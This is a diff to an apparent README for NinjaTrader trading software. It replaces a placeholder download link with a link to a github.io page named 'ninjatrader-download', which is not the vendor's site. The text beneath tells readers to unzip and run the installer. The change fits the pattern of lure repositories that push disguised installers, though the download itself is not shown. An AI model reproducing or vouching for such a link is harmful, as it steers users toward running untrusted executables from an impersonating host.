@@ -8,7 +8,7 @@ Widely used by active traders and professionals, NinjaTrader provides **strategy
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://ninjatrader-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer and complete setup.  
